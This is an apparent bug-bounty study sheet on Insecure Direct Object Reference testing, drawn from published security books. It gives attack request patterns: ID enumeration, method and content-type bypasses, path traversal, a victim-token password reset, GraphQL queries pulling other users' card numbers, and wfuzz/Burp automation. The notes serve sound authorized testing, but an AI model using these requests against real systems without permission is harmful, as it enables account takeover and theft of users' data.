# Insecure Direct Object References (IDOR)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
Accessing/modifying resources by manipulating object references (IDs) in requests. Missing authorization check on the backend.

## Finding IDORs

### Where to Look
- URL path: `/api/users/1234/profile`
- Query params: `?user_id=1234&order_id=5678`
- Body params: `{"user_id": 1234}`
- JSON API responses with IDs
- GraphQL queries/mutations
- Indirect references: `?filename=report.pdf`
- Headers: `X-User-Id: 1234`

### Steps
1. Create two accounts (user A and user B)
2. Perform an action as user A, capture the request
3. Change the object ID to user B's resource
4. Check if user A can access/modify user B's data
5. Test all HTTP methods — sometimes GET is protected but POST/PUT/DELETE is not

---

## Testing Patterns

### Direct Numeric ID Manipulation
```
GET /api/orders/1001 → try 1000, 1002, 1
GET /api/users/1234 → try 1235
```

### Encoded IDs
```
# Base64 encoded:
dXNlcklkPTEyMzQ=  → userId=1234 → decode, modify, re-encode

# GUID/UUID:
GET /api/users/550e8400-e29b-41d4-a716-446655440000
# Try other users' UUIDs from API responses, emails, public profiles
```

### Hashed IDs
If IDs are MD5 hashes of sequential numbers:
```bash
for i in $(seq 1 100); do echo -n $i | md5sum; done
```

### Predictable Patterns
- `user_20230101_001` → try `user_20230101_002`
- Filenames with username: `invoice_john_doe_001.pdf` → `invoice_jane_doe_001.pdf`

---

## IDOR Bypasses

### Change Request Method
```
GET /api/users/1234/delete  → 403
DELETE /api/users/1234      → 200

POST /api/users/1234        → 403
PUT /api/users/1234         → 200
```

### Change Content-Type
```
# Original: Content-Type: application/json {"id": 123}
# Try: Content-Type: application/x-www-form-urlencoded  id=123
```

### Array Wrapping
```json
{"id": "123"}
{"id": ["123", "456"]}
```

### Wildcard / Glob
```
GET /api/users/123/reports
GET /api/users/*/reports
GET /api/users/null/reports
```

### Add Extra Parameters
```
# Original request has no user_id param
# Try: ?user_id=victim_id, ?uid=, ?account_id=
```

---

## Horizontal vs Vertical IDOR

| Type | Description | Example |
|---|---|---|
| Horizontal | Same privilege level, different user | User A reads User B's data |
| Vertical | Lower privilege accessing higher privilege | Regular user accessing admin endpoint |

---

## Blind IDORs
When you can't see the response but the action happens:
```
POST /api/invoices/1234/send-email
→ No response content, but invoice emailed to attacker's email
→ Check side effects: Does victim receive notification? Does admin log show the action?
```

---

## Finding Object IDs

1. **API responses**: Look at ALL responses for IDs
2. **Public profiles**: `/users/username` → might expose `user_id`
3. **Emails**: Often contain IDs in links
4. **Referrer header**: Can leak IDs
5. **IDOR in search**: Search for items → observe IDs
6. **Invite/share features**: Token or ID in shared URL

---

## Common IDOR Scenarios

### Account Info
```
GET /api/users/1234
POST /api/users/1234/update {"email":"attacker@evil.com"}
DELETE /api/users/1234
```

### File Access
```
GET /files/report_user_1234.pdf
GET /download?file=../admin/sensitive.pdf  (path traversal variant)
```

### Orders/Transactions
```
GET /orders/98765
PUT /orders/98765 {"status":"shipped"}  → status fraud
```

### Password Reset IDOR
```
POST /password-reset {"token":"VICTIM_TOKEN","new_password":"hacked"}
# If token tied to user ID, can we reset someone else's password?
```

---

## API & GraphQL IDOR

```graphql
# Test if you can query other users' data
query {
  user(id: "1234") {
    email
    privateData
    creditCards { number cvv }
  }
}

# Mutation IDOR
mutation {
  updateProfile(userId: "5678", email: "attacker@evil.com") {
    success
  }
}

# Batch enumeration
[
  {"query": "{ user(id: \"1\") { email } }"},
  {"query": "{ user(id: \"2\") { email } }"}
]
```

---

## Automating IDOR Discovery

### Burp Intruder
```
GET /api/orders/§1001§
Payload: Numbers 1-5000
Grep-match response for different user data
```

### wfuzz
```bash
wfuzz -z range,1-1000 \
  -H "Cookie: session=YOUR_SESSION" \
  --hl 0 \
  https://target.com/api/orders/FUZZ
```

### Autorize (Burp Extension)
Auto-replaces session cookie with low-priv user cookie, detects 200 responses that should be 403.

---

## Real-World Examples (Yaworski)
- **Binary.com**: IDOR via `client_id` param — read any user's financial transactions
- **Twitter Mopub** ($5,040): IDOR via `app_id` — access any advertiser's campaign data
- **Moneybird**: Mass assignment — send read-only attribute in PUT request → elevate own permissions

## Testing Checklist
- [ ] Map all endpoints with IDs
- [ ] Create two test accounts
- [ ] Test horizontal access (user A → user B data)
- [ ] Test vertical access (user → admin data)
- [ ] Test different HTTP methods
- [ ] Test encoded/hashed IDs
- [ ] Test indirect references (filenames)
- [ ] Test array wrapping and wildcard
- [ ] Check blind IDORs (side effects)

## Severity
- **Low**: View non-sensitive info (e.g., profile picture URL)
- **Medium**: View sensitive info (email addresses, phone numbers)
- **High**: Modify or delete another user's data
- **Critical**: Account takeover, mass data exfiltration, admin access
